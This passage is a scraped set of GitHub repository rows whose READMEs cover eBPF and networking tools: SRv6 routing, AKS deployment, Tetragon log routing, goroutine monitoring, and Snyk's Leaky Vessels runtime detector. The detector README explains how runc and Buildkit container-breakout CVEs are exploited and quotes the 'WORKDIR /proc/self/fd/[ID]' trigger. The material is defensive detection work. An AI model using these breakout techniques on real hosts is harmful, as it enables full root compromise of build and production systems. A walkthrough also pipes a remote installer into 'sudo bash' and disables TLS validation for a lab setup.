| `flex-algo` | Flex Algorithm intent. When defining an SFC intent it has to be the first one, or the second one after an SFC intent. |
| `high-bandwidth` | High Bandwidth intent. |
| `low-bandwidth` | Low Bandwidth intent. |
| `low-latency` | Low Latency intent. |

### Configuration Example
The following example shows a configuration file for a service with three applications. The first application has two SIDs for SRv6 routing and two intents, namely SFC and Flex Algorithm. The second application has one intent, namely High Bandwidth. The third application has four intents, namely Flex Algorithm, Low Bandwidth, Low Latency, and SFC. The third application also has a list of IPv6 addresses assigned to it.

```yaml
---
hawkeye:
  enabled: true
  address: fcbb:cc00:5::f
  port: 5001
services:
  service1:
    domain_name: service1.com
    applications:
      - port: 80
        sid:
          - fcbb:bb00:1::2
          - fcbb:bb00:2::2
        intents:
          - intent: sfc
            functions:
              - function1
              - function2
      - port: 8080
        intents:
          - intent: flex-algo
            flex_algo_number: 1
  service2:
    domain_name: service2.com
    applications:
      - port: 1433
        sid:
          - fcbb:bb00:2::2
          - fcbb:bb00:3::2
        intents:
          - intent: high-bandwidth
            min_value: 1
            max_value: 2
  service3:
    ipv6_addresses:
      - fcbb:cc00:4::a
      - fcbb:cc00:4::b
      - fcbb:cc00:4::c
    applications:
      - port: 443
        intents:
          - intent: flex-algo
            flex_algo_number: 1
          - intent: low-bandwidth
            min_value: 1
            max_value: 2
          - intent: low-latency
            min_value: 1
            max_value: 2
      - port: 8080
        intents:
          - intent: sfc
            functions:
              - function1
              - function2
      - port: 18
        intents:
          - intent: low-bandwidth
      - port: 19
        intents:
          - intent: low-bandwidth
          
```

## Getting Started
To use HawkWing, you can either build it from source or use the pre-built binaries.

### Prerequisites
- Linux Kernel 5.15 or higher
- Privileged access to the client and server
- IPv6 connectivity between the client and server
- Configuration file (see [Configuration Structure](#configuration-structure))

### Client-Mode
On the client the application can be started using the following command:
```bash
sudo hawkwing client -i <interface> --config <config-file>
```

### Server-Mode
On the server the application can be started using the following command:
```bash
sudo hawkwing server -i <interface>
```

### Using Docker
HawkWing can also be run using Docker. To run HawkWing using Docker, use the following commands:  
  
On the client:
```bash
docker run ghcr.io/hawkv6/hawkwing --privileged --network=host -v /path/to/config:/config hawkwing client -i <interface> --config /config/config.yaml 
```
On the server:
```bash
docker run ghcr.io/hawkv6/hawkwing --privileged --network=host hawkwing server -i <interface>
```
"
amitmavgupta/azure-bicep,2,2,2,0,Bicep,AKS clusters created with different CNI's using Bicep,2024-01-25T16:05:21Z,2025-05-18T04:32:19Z,77,"# What is the main purpose of the repo?
This repo will discuss how to deploy **AKS clusters with Bicep**:

* Bring your own CNI (BYOCNI)
* Bring your own CNI (BYOCNI) with Dual Stack
* Bring your own CNI (BYOCNI) with Azure Linux as the host OS
* Isovalent Enterprise for Cilium in Azure Marketplace.
* Isovalent Enterprise for Cilium in Azure Marketplace (Azure Linux as the host OS).
* Azure CNI powered by Cilium (Overlay Mode) with Cilium as the Network Policy
* Azure CNI powered by Cilium (Overlay Mode) with Azure Linux as the host OS

# Ensure you have enough quota
Go to the Subscription blade, navigate to ""Usage + Quotas"", and make sure you have enough quota for the following resources:

* Regional vCPUs
* Standard Dv4 Family vCPUs

# How to get going with Bicep?

* name=aksbicep
* locationname=canadacentral
* resourceGroup=aksbicep
* az group create --name $name --location $locationname
* az deployment group validate -f aks.bicep -p aks.bicepparam -g $resourceGroup
* az deployment group create -f aks.bicep -p aks.bicepparam -g $resourceGroup
* az group delete --name $resourceGroup
"
snyk/leaky-vessels-dynamic-detector,103,9,103,1,C,Leaky Vessels Dynamic Detector,2024-01-31T09:07:19Z,2025-08-22T20:51:20Z,14,"# WARNING
This repository is now archived.

No more updates will be made to the code and it may be insecure or even broken by the time you read this notice.
Consider it for historical purpose only and treat it carefully.

# Leaky Vessels Dynamic Detector

![snyk-oss-category](https://github.com/snyk-labs/oss-images/blob/d7a72392dd568658c2009a161803959466595094/oss-community.jpg)

In this repository you'll find a reference implementation for an eBPF-based runtime detection for the runc and Docker vulnerabilities `CVE-2024-21626`, `CVE-2024-23651`, `CVE-2024-23652` and `CVE-2024-23653`. It hooks into Linux syscalls (e.g., `chdir`, `mount`) and function invocations of the Docker daemon and associates them with Docker builds and container processes to identify exploitations of these vulnerabilities.
For a static analysis-based approach, please see [this](https://github.com/snyk/leaky-vessels-static-detector). 

### runc process.cwd & Leaked fds Container Breakout [CVE-2024-21626]

CVE-2024-21626 is a vulnerability in the `runc` container runtime allowing an attacker to break out of the container isolation and achieve full root RCE via a crafted image that exploits an issue within the `WORKDIR` instruction's handling. Since there's a ""race"" condition between the time some file descriptors to the host are opened and closed, an attacker can create a Dockerfile with the following instruction `WORKDIR /proc/self/fd/[ID]` (with ID being a system dependent file descriptor) that will point to the underlying host machine's file system. This can be exploited when running:


1. `docker build` - In 2 cases:
   - When the Dockerfile being built contains the exploit triggerting instruction.
   - When the Dockerfile being built refers to a base image via the `FROM` instruction that contains an `ONBUILD` command triggering the exploit e.e. `ONBUILD WORKDIR /proc/self/fd/[ID]`. The `ONBUILD` instruction injects the command not in the image that contains it but in the image that uses it as a base image. This means that if a base image is compromised or intentionally nefarious i.e. hosted on Dockerhub or other public container registries, exploitation if possible even if nothing changes in the image that the `docker build` command actually builds.  
2. `docker run`


Thus, this vulnerability can put both build systems and production environments at risk.

### Buildkit Mount Cache Race: Build-time Race Condition Container Breakout [CVE-2024-23651]

CVE-2024-23651 is a vulnerability in Docker where a `RUN` command is using the `--mount=cache` flag. There's a time-of-check/time-of-use (TOCTOU) vulnerability between the check that a `source` dir exists on the Docker daemon's host and the actual call to the `mount` syscall. An attacker is able to craft a Dockerfile that would plant a symlink in between these two calls to induce an arbitrary bind mount that results in full root RCE on the host.
This vulnerability only affects the `docker build` command.

### Buildkit GRPC SecurityMode Privilege Check [CVE-2024-23653]

CVE-2024-23653 is a vulnerability in Docker that occurs when using a custom Buildkit LLB generator is used with the `# syntax` directive. The generator can use the Client.NewContainer and Container.Start GRPC calls to execute a new container during build. The StartRequest.SecurityMode argument is not appropriately checked against the privilege expectations of the docker daemon or docker build call, which allows the GRPC caller to create a privileged container during build. This new privileged container can then be escaped to gain full root RCE on the build host.
This vulnerability only affects the `docker build` command.

### Buildkit Build-time Container Teardown Arbitrary Delete [CVE-2024-23652]

CVE-2024-23652 is an arbitrary deletion vulnerability in Docker. When `RUN --mount` is used in a Dockerfile, if the target of the mount does not exist it will be created for that environment. When the execution completes this created directory will be cleaned up. If the executing command changes the path used for the mount to a symbolic link, the cleanup procedure will traverse this symbolic link and potentially clean up arbitrary directories in the host root filesystem.
This vulnerability only affects the `docker build` command.

## Installation & usage

### Build-time eBPF detection

The build-time detection applies to all 4 vulnerabilities.

1. Compile the detector binary: `GOOS=linux GOARCH={{amd64/arm64}} go build`.
2. Run the compiled binary in the background using `sudo` (as required by eBPF) in your build environment (i.e., `sudo ebpf-detector &`).
3. If an exploitation of one of the vulnerabilities is detected, you'll see `Leaky vessels vulnerability detected` printed to `STDOUT`, alongside the respective CVE, vulnerability name and additional forensics.

### Kubernetes run-time eBPF detection

The run-time detection applies the `WORKDIR` vulnerability only (CVE-2024-21626).

1. Build the container image of the detector using the provided `Dockerfile` and push it to an image registry.
2. Populate the `image` value in the `detector.yaml` (marked with `TODO`).
3. Run the detector as a DaemonSet in your Kubernetes cluster by running `kubectl apply -f detector.yml`.
4. If a WORKDIR vulnerability exploitation is detected, you'll see `Leaky Vessels vulnerability detected` printed in the DaemonSet pod logs.

## Testing

Unit tests need to run in `sudo`, as they rely on eBPF: `sudo go test ebpf-detector/...`.

## Limitations

* Requires root access / running containers in privileged mode (required by eBPF).
* The runtime `WORKDIR` exploitation (`CVE-2024-21626`) happens during container initialization, so it won't be detected on running containers. The detection also assumes the container runtime is `containerd`.
* The Buildkit Mount Cache Race (`CVE-2024-23651`) and Buildkit Build-time Container Teardown Arbitrary Delete (`CVE-2024-23652`) detections are timing-based and may have false negatives due to race conditions.
* Tested in the following environments:
    - Ubuntu 20.04/22.04 (AMD64)
    - GKE (Ubuntu and Alpine Linux, AMD64)
    - EKS (Ubuntu and Alpine Linux, AMD64) - supported by EKS version >= 1.25
    - Ubuntu 22.04 (ARM64)

## Issues
For updated list of bugs and issues see the project issues. 

## Contributing
Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.

## License
The Leaky Vessels Dynamic Detector is under the Apache-2.0 license. See [LICENSE](LICENSE) for more information.
"
hamidrezakhosroabadi/xdp-observer,6,2,6,1,C,A simple xdp application to observe tcp connections in userspace.,2024-02-09T16:20:27Z,2024-04-01T22:18:44Z,5,"# xdp-observer
A simple xdp application to observe tcp connections in userspace.

## How to run?
```
docker build . -t xdp-observer:latest
docker run -it --privileged xdp-observer:latest bash
/lib64/ld-linux-x86-64.so.2 --library-path /lib64 ./main eth0
```
### Screenshot
![alt text](sc.png)"
YutaroHayakawa/bpfib,27,4,27,4,Go,BPF IP routing toolkit,2024-02-11T14:29:13Z,2025-09-16T08:11:26Z,46,"# bpfib

`bpfib` is a CLI tool that contains various subcommands useful for IP routing with BPF.

## Subcommands

### lookup

`bpfib lookup` is an `ip route get`, but for `bpf_fib_lookup`. In some cases,
regular Linux FIB lookup and `bpf_fib_lookup` produces different results for
the same parameter. For example, `bpf_fib_lookup` is forwarding only (cannot
handle the `local` routes), and unicast only (cannot handle multicast routes,
Light Weight Tunnel routes such as MPLS or SRv6 routes). This means `ip route
get` does not always reflect the result of FIB lookup with `bpf_fib_lookup`.
This command allows you to lookup FIB from BPF's perspective, but without
writing BPF program.

#### Usage

```
Lookup FIB using bpf_fib_lookup helper function

Usage: lookup [flags] dest iif [options]

Options:

	totlen		<length>			Total length of the IP packet
	tos		<tos in hex>			ToS for IPv4
	flowinfo	<flowinfo in hex>		Flow Label + Priority for IPv6
	from		<address>			Source address
	l4proto		<tcp|udp>			L4 protocol
	sport		<port>				Source port
	dport		<port>				Destination port

Flags:
      --direct   Set direct option (BPF_FIB_LOOKUP_DIRECT)
  -h, --help     help for lookup
      --output   Set output option (BPF_FIB_LOOKUP_OUTPUT)
```

#### Example

```
$ ip r show dev eth0 table all
default via 10.1.33.1 proto dhcp metric 600
...
local 10.1.33.24 table local proto kernel scope host src 10.1.33.24

$ ip -d r get 10.1.33.1 dev eth0
unicast 10.1.33.1 dev eth0 table main src 10.1.33.24 uid 1000
    cache

$ bpfib lookup 10.1.33.1 eth0
10.1.33.1 dev eth0 mtu 1500 smac f0:9e:4a:8c:0d:34 dmac e4:83:26:4b:ad:bd metric 600

$ ip -d r get 10.1.33.24 dev eth0
local 10.1.33.24 dev lo table local src 10.1.33.24 uid 1000
    cache <local>

$ bpfib lookup 10.1.33.24 eth0
Not Forwarded (BPF_FIB_LKUP_RET_NOT_FWDED)
```
"
criblio/o11y-taming-tetragon,0,0,0,0,,"Ingest, enrich, and transform Tetragon agent logs with Cribl Edge",2024-01-16T20:34:21Z,2024-02-05T23:40:29Z,26,"<base target=""_blank"">

# Demo Walkthrough

The steps below will walk you through setting up Isovalent's Tetragon agent (the open source version) and Cribl Edge to collect, transform, and route the Tetragon logs. We will enforce a standard format for Tetragon events, transform, optimize, and route events to a destination, and help you achieve ultimate observability GOAT status!

The commands below assume Ubuntu Linux 22.04 running on an ARM-based processor. Need an Ubuntu virtual machine? [Multipass](https://multipass.run/install ) from Canonical runs on Linux, Windows, and MacOS.
Starting an Ubuntu instance is as easy as  
```
multipass launch lts -n criblGOAT
```

## Step 1: Update the Ubuntu instance
The first step is to update your Ubuntu instance. Run the following command in a CLI:

If you used Multipass, use the command below to SSH to the instance `multipass shell [instance_name]`

```
sudo apt update && sudo apt upgrade -y
```

## Step 2: Install Tetragon as a Service
Use the installation instructions at the [Tetragon docs website](https://tetragon.io/docs/installation/package/). The commands below are copied for convenience, but may change. The documentation is the truth!

Choose the command for AMD/x86_64 or ARM64, as appropriate.

### For AMD/x86_64
```
curl -LO https://github.com/cilium/tetragon/releases/download/v1.0.0/tetragon-v1.0.0-amd64.tar.gz
tar -xvf tetragon-v1.0.0-amd64.tar.gz
cd tetragon-v1.0.0-amd64/
sudo ./install.sh
rm -rf ../tetragon-v1.0.0-amd64.tar.gz
```

### For ARM64
```
curl -LO https://github.com/cilium/tetragon/releases/download/v1.0.0/tetragon-v1.0.0-arm64.tar.gz
tar -xvf tetragon-v1.0.0-arm64.tar.gz
cd tetragon-v1.0.0-arm64/
sudo ./install.sh
rm -rf ../tetragon-v1.0.0-arm64.tar.gz
```

## Step 3: Install Cribl Edge
To install an instance of [Cribl Edge](https://cribl.io/edge/) on your Linux server, log into your [Cribl.Cloud account](https://manage.cribl.cloud/) and follow the steps below.

**Don't have a Cribl Cloud account? [Sign up for a free account](https://cribl.io/cribl-cloud/try-cribl-cloud/) and process 1TB/day of data!**

1. Click Manage Edge.
2. From the Edge landing page, click [default_fleet](images/edge-default-fleet.png) (free accounts have one Fleet).
3. In the top-right corner, click [Add/Update Edge Node](images/edge-add-node-dropdown.png). Select [Linux > Add](images/edge-add-linux-node.png).
4. Copy the [command](images/edge-add-linux-node.png) and paste it into your Linux instance.

**NOTE**
If you are not logged in as root, you will need to add `sudo` to the command after the `|` in the `| bash -` part of the commands as in the example below.
```
curl 'https://[YOUR_INSTANCE_NAME].cribl.cloud/init/install-edge.sh?group=default_fleet&token=[YOUR_LEADER_TOKEN]&user=cribl&install_dir=%2Fopt%2Fcribl' | sudo bash -
```
For more details on installing and managing Cribl Edge, review the [Installing Cribl Edge on Linux](https://docs.cribl.io/edge/deploy-single-instance/) documentation.


### Step 4: Change the Group and Update Permissions
>NOTE
>Tetragon needs to run as `root` and the files it creates are restricted to `root:root`.
>Cribl Edge runs as a dedicated user `cribl` who belongs to the `cribl` group -- `cribl:cribl`. We need to give the `cribl` user group access to the Tetragon log file and path.

Change the group and grant permissions to the `cribl` group to read and traverse the default Tetragon log location.
```
sudo chown -R :cribl /var/log/tetragon/
sudo chmod -R 750 /var/log/tetragon/
```

## Step 5: Quick Break
Let's check our work before moving on.

- Check access to the tetragon.log file as the cribl user
```
sudo -H -u cribl bash -c 'cat /var/log/tetragon/tetragon.log'
```

- Check the status of the tetragon agent running as a service
```
sudo systemctl status tetragon
```

- Check the status of the cribl-edge agent running as a service
```
sudo systemctl status cribl-edge
```

## Step 6: Deploy Policies
With both Cribl Edge and the Tetragon agent deployed, we can deploy some policies to Tetragon to capture more than the baseline syscalls. While the intricacies of the Linux kernel, eBPF, and writing Tetragon policies are out of scope for this demo, you can follow the respective links to learn from the folks at Isovalent. If you really want to nerd out on eBPF, [Learning eBPF](https://isovalent.com/books/learning-ebpf/ ) by [Liz Rice](https://www.linkedin.com/in/lizrice/?originalSubdomain=uk), Isovalent's Chief Open Source Officer, is a fantastic read.

The policy below will attach to the kernel via a kprobe and capture tcp_connect and tcp_close calls. These calls will return details about Source and Destination addresses, TCP socket state, etc. 

Paste the following into the SSH session.
```
cat << EOF | sudo tee -a /etc/tetragon/tetragon.tp.d/tcp-sockets.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: ""tcp-sockets""
spec:
  kprobes:
  - call: ""tcp_connect""
    syscall: false
    args:
    - index: 0
      type: ""sock""
  - call: ""tcp_close""
    syscall: false
    args:
    - index: 0
      type: ""sock""
EOF
```

Restart the Tetragon agent.  
```
sudo systemctl restart tetragon
```

## Step 7: Verify our work so far
After restarting the tetragon service, verify the policy worked by running the following commands.
The `sudo ... | grep` returns JSON objects containing `""function_name"":""tcp_connect""` if Tetragon is working correctly.
```
wget google.com
sudo grep -i --color=always 'google.com' /var/log/tetragon/tetragon.log | grep -i --color=always 'tcp_connect'
```

## Step 8: Disable TLS Certificate Validation
**< WARNING >**  
This step disables TLS certificate validation and should only be used in a lab environment where self-signed certificates are used.

_In production environments, you should leave this enabled._

1. Navigate to [Cribl.Cloud](https://manage.cribl.cloud/) > Manage Edge
2. Select [default_fleet](images/edge-default-fleet.png) 
3. Click [Fleet Settings](images/edge-fleet-settings.png) > [Default TLS Settings](images/edge-fleet-default-tls.png) in the left nav 
4. Toggle Validate server certs switch to No
5. Click [Commit & Deploy](images/commit-and-deploy.png) in the top right 

Wait about 30 seconds, then proceed to the next step.

## Step 9: Import Configurations into Cribl.Cloud

To make the next step easy, we are going to import configurations into Cribl.Cloud. In a production environment, you would build these as part of your overall configurations.

** Do _NOT_ overwrite production configurations with these configs **

As a reminder, you need to [Commit & Deploy](images/commit-and-deploy.png) any changes you make to the configuration before you will see the results reflected in your environment.

### Import the Source configuration
1. Navigate to [Cribl.Cloud](https://manage.cribl.cloud/) > Manage Edge
2. Select [default_fleet](images/edge-default-fleet.png)
3. From the *More* menu dropdown, [select *Sources*](images/edge-sources-dropdown.png)
     - If you don't see a [`File Monitor`](images/sources-file-monitor.png) tile, toggle the view from Grid to List and click `Add Source`
     - If you see a [`File Monitor`](images/sources-file-monitor.png) tile, click the tile and then click `Add Source`
4. In the lower-left corner of the `New Source` screen, click `Manage as JSON`
5. Copy and paste the source configuration below, over-writing everything in the box
6. Click `OK` and then, on the `New Source` config, click `Save`

```
{
  ""id"": ""tetragon-logs"",
  ""disabled"": false,
  ""sendToRoutes"": true,
  ""pqEnabled"": false,
  ""streamtags"": [],
  ""mode"": ""manual"",
  ""interval"": 10,
  ""filenames"": [
    ""*/log/*"",
    ""*log""
  ],
  ""tailOnly"": false,
  ""idleTimeout"": 300,
  ""checkFileModTime"": false,
  ""forceText"": false,
  ""hashLen"": 256,
  ""staleChannelFlushMs"": 10000,
  ""includeUnidentifiableBinary"": false,
  ""type"": ""file"",
  ""breakerRulesets"": [],
  ""path"": ""/var/log/tetragon/tetragon.log"",
  ""connections"": [
    {}
  ]
}
```

`Commit & Deploy` before moving on to the next section

![](images/commit-and-deploy.png)

### Import the Pack
> [Cribl Packs](https://packs.cribl.io/) allow for the easy distribution of [routes](https://docs.cribl.io/stream/routes/), [pipelines](https://docs.cribl.io/stream/pipelines/), and [knowledge objects](https://docs.cribl.io/stream/packs-standards/#knowledge-objects). In this case, our Pack targets Tetragon agent logs with all the required functions and lookups to parse and enrich the data stream.

1. Navigate to [Cribl.Cloud](https://manage.cribl.cloud/) > Manage Edge
2. Select [default_fleet](images/edge-default-fleet.png)
3. From the *More* menu dropdown, select *Packs*
4. Click the [`Add Pack`](images/packs-add-from-dispensary.png) on the right side of the screen and select `Add from Dispensary`
5. In the search box, type `tetragon` and click the tile
6. Click `Add Pack` to add the contents of the Pack to your environment

> If you want to download the `.crbl` file directly, you can go to the [Dispensary website](https://packs.cribl.io/?query=tetragon) and see all the pack details, including the option to download.

`Commit & Deploy` before moving on to the next section

![](images/commit-and-deploy.png)


### Import Destination

This demo uses a New Relic endpoint as the Destination, but you can use any endpoint that accepts logs. Make sure to name the Destination `tetragon-logs` so it matches the imported `route` configuration.

1. Navigate to [Cribl.Cloud](https://manage.cribl.cloud/) > Manage Edge
2. Select [default_fleet](images/edge-default-fleet.png)
3. From the *More* menu dropdown, select *Destinations* and then type [`New Relic` in the search box](images/edge-destinations-new-relic.png)
   - Not sending to New Relic? Search for your destination by name!
4. Click the `Logs & Metrics` and then the `Add Destination` button
5. In the lower-left corner of the `New Destination` screen, click `Manage as JSON`
6. Copy and paste the destination configuration below, over-writing everything in the box
7. Click `OK` and then, on the `New Destination` config, click `Save`
   
*Update the `apiKey` value with a New Relic Ingest key*
```
{
  ""id"": ""tetragon-logs"",
  ""systemFields"": [
    ""cribl_pipe""
  ],
  ""streamtags"": [],
  ""region"": ""US"",
  ""logType"": ""tetragon-linux"",
  ""messageField"": """",
  ""concurrency"": 5,
  ""maxPayloadSizeKB"": 1024,
  ""maxPayloadEvents"": 0,
  ""compress"": true,
  ""rejectUnauthorized"": true,
  ""timeoutSec"": 30,
  ""flushPeriodSec"": 1,
  ""useRoundRobinDns"": false,
  ""failedRequestLoggingMode"": ""none"",
  ""safeHeaders"": [],
  ""onBackpressure"": ""block"",
  ""authType"": ""manual"",
  ""type"": ""newrelic"",
  ""apiKey"": ""INGEST-KEY-HERE"",
  ""metadata"": []
}
```

`Commit & Deploy` before moving on to the next section

![](images/commit-and-deploy.png)


### Import the Routes configuration
1. Navigate to [Cribl.Cloud](https://manage.cribl.cloud/) > Manage Edge
2. Select [default_fleet](images/edge-default-fleet.png)
3. From the *More* menu dropdown, select *Data Routes*
     - There should only be a `default` route. If there are other routes defined, you aren't using a test environment! 
4. Click the [`Manage as JSON`](/images/edge-routes-manage-json.png) icon to the right of the `Add Route` button
5. Copy and paste the route configuration below, over-writing everything in the box
6. Click `Save`

```
{
  ""id"": ""default"",
  ""groups"": {},
  ""comments"": [
    {
      ""id"": ""haSJVr"",
      ""comment"": ""Route `process_kprobe` events to tetragon-network-linux pipeline"",
      ""index"": 0
    }
  ],
  ""routes"": [
    {
      ""id"": ""BLbEiH"",
      ""name"": ""tetragon-kprobes"",
      ""final"": true,
      ""disabled"": false,
      ""pipeline"": ""pack:cribl-isovalent-linux"",
      ""description"": ""Route only BPF events that describe process actions (eg process_kprobes, process_exec, etc.)"",
      ""clones"": [],
      ""enableOutputExpression"": false,
      ""filter"": ""(Object.keys(JSON.parse(_raw))[0]).startsWith('process_')"",
      ""output"": ""tetragon-logs""
    },
    {
      ""id"": ""default"",
      ""name"": ""default"",
      ""final"": true,
      ""disabled"": false,
      ""pipeline"": ""devnull"",
      ""description"": """",
      ""clones"": [],
      ""enableOutputExpression"": false,
      ""filter"": ""true"",
      ""output"": ""devnull""
    }
  ]
}
```


`Commit & Deploy` before going to your observability platform of choice to see your Tetragon logs!

![](images/commit-and-deploy.png)


"
keyval-dev/opentelemetry-go-instrumentation,296,45,296,22,C,OpenTelemetry auto-instrumentation for Go applications,2022-02-13T07:28:39Z,2025-04-03T07:54:22Z,41,"# OpenTelemetry Auto-Instrumentation for Go

This project adds [OpenTelemetry instrumentation](https://opentelemetry.io/docs/concepts/instrumenting/#automatic-instrumentation)
to Go applications without having to modify their source code.
We support a wide range of Go versions (1.12+) and even work on stripped binaries.

Our goal is to provide the same level of automatic instrumentation for Go as exists for languages such as Java and Python.

This automatic instrumentation is based on [eBPF](https://ebpf.io/) uprobes.

For more information, see our [How it works](docs/how-it-works.md) document.

## Getting Started

Check out our [Getting Started on Kubernetes](docs/getting-started/README.md) guide for easily instrumenting your first Go applications.

## Current Instrumentations

| Library/Framework |
| ----------------- |
| net/http - Server |
| gRPC - Client     |
| gRPC - Server     |
| Gorilla Mux       |

## Project Status

This project is actively maintained by [keyval](https://keyval.dev) and is currently in its initial days. We would love to receive your ideas, feedback & contributions.

## Contributing

Please refer to the [contributing.md](CONTRIBUTING.md) file for information about how to get involved. We welcome issues, questions, and pull requests.

## License

This project is licensed under the terms of the Apache 2.0 open source license. Please refer to [LICENSE](LICENSE) for the full terms.
"
keisku/gmon,189,3,189,3,Go,An eBPF tool monitoring a goroutine,2024-01-08T11:52:33Z,2025-09-12T22:36:37Z,77,"# Goroutine MONitor (gmon)

<img src=""https://github.com/egonelbre/gophers/blob/63b1f5a9f334f9e23735c6e09ac003479ffe5df5/sketch/science/welding.png?raw=true"" width=""200"" height=""200"">

`gmon` is a tool designed to monitor the creation and destruction of goroutines in a Go program, drawing inspiration from the presentation [Real World Debugging with eBPF](https://www.usenix.org/conference/srecon23apac/presentation/liang).

# Prerequisites

- amd64 (x86_64)
- Linux Kernel 5.8+ since `gmon` uses [BPF ring buffer](https://nakryiko.com/posts/bpf-ringbuf/)
- Target Go binary must be compiled with Go 1.23+ since `gmon` uses fixed offset to get goroutine ID

# Usage

```
Usage of gmon:
  -level string
    	log level could be one of [""DEBUG"" ""INFO"" ""WARN"" ""ERROR""] (default ""INFO"")
  -metrics int
    	Port to be used for metrics server, /metrics endpoint (default 5500)
  -path string
    	Path to executable file to be monitored (required)
  -pid int
    	Useful when tracing programs that have many running instances
  -pprof int
    	Port to be used for pprof server. If 0, pprof server is not started
  -trace string
    	Path to Go runtime/trace output
```

## Demo

https://github.com/keisku/gmon/assets/41987730/838fa12d-d622-4ad6-a9f0-6aab88acec55

## Stdout

`gmon` logs the creation of goroutines to stdout with stack traces.

```bash
sudo gmon -path /path/to/executable
time=2024-03-20T05:10:57.752Z level=INFO msg=""goroutine is created"" goroutine_id=22 stack.0=runtime.newproc stack.1=runtime.systemstack stack.2=runtime.newproc stack.3=net/http.(*connReader).startBackgroundRead stack.4=net/http.(*conn).serve stack.5=net/http.(*Server).Serve.gowrap3 stack.6=runtime.goexit
time=2024-03-20T05:10:57.752Z level=INFO msg=""goroutine is created"" goroutine_id=21 stack.0=runtime.newproc stack.1=runtime.systemstack stack.2=runtime.newproc stack.3=net/http.(*Server).Serve stack.4=net/http.(*Server).ListenAndServe stack.5=main.main.gowrap1 stack.6=runtime.goexit
time=2024-03-20T05:10:57.752Z level=INFO msg=""goroutine is created"" goroutine_id=23 stack.0=runtime.newproc stack.1=runtime.systemstack stack.2=runtime.newproc stack.3=net/http.(*Server).Serve stack.4=net/http.(*Server).ListenAndServe stack.5=main.main.gowrap1 stack.6=runtime.goexit
time=2024-03-20T05:10:57.752Z level=INFO msg=""goroutine is created"" goroutine_id=34 stack.0=runtime.newproc stack.1=runtime.systemstack stack.2=runtime.newproc stack.3=net/http.(*Server).Serve stack.4=net/http.(*Server).ListenAndServe stack.5=main.main.gowrap1 stack.6=runtime.goexit
time=2024-03-20T05:10:57.752Z level=INFO msg=""goroutine is created"" goroutine_id=24 stack.0=runtime.newproc stack.1=runtime.systemstack stack.2=runtime.newproc stack.3=net/http.(*connReader).startBackgroundRead stack.4=net/http.(*conn).serve stack.5=net/http.(*Server).Serve.gowrap3 stack.6=runtime.goexit
time=2024-03-20T05:10:57.752Z level=INFO msg=""goroutine is created"" goroutine_id=35 stack.0=runtime.newproc stack.1=runtime.systemstack stack.2=runtime.newproc stack.3=net/http.(*connReader).startBackgroundRead stack.4=net/http.(*conn).serve stack.5=net/http.(*Server).Serve.gowrap3 stack.6=runtime.goexit
```

## OpenMetrics

`gmon` exposes the following metrics in the [OpenMetrics](https://www.cncf.io/projects/openmetrics/) format on the `GET /metrics`.

- `gmon_goroutine_creation`
- `gmon_goroutine_exit`
- `gmon_goroutine_uptime`

```bash
curl -s http://localhost:5500/metrics

# HELP gmon_goroutine_creation The number of goroutines that have been creaated
# TYPE gmon_goroutine_creation counter
gmon_goroutine_creation{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc""} 1
gmon_goroutine_creation{stack_0=""runtime.goexit"",stack_1=""net/http.(*Server).Serve.gowrap3"",stack_2=""net/http.(*conn).serve"",stack_3=""net/http.(*connReader).startBackgroundRead"",stack_4=""runtime.newproc""} 3
# HELP gmon_goroutine_exit The number of goroutines that have been exited
# TYPE gmon_goroutine_exit counter
gmon_goroutine_exit{stack_0=""runtime.goexit"",stack_1=""net/http.(*Server).Serve.gowrap3"",stack_2=""net/http.(*conn).serve"",stack_3=""net/http.(*connReader).startBackgroundRead"",stack_4=""runtime.newproc""} 3
# HELP gmon_goroutine_uptime Uptime of goroutines in seconds
# TYPE gmon_goroutine_uptime histogram
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""1""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""3""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""5""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""10""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""30""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""60""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""120""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""180""} 2
gmon_goroutine_uptime_bucket{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc"",le=""+Inf""} 2
gmon_goroutine_uptime_sum{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc""} 0.9001332019999999
gmon_goroutine_uptime_count{stack_0=""runtime.goexit"",stack_1=""main.main.gowrap1"",stack_2=""net/http.(*Server).ListenAndServe"",stack_3=""net/http.(*Server).Serve"",stack_4=""runtime.newproc""} 2
...skip...
```

# Development

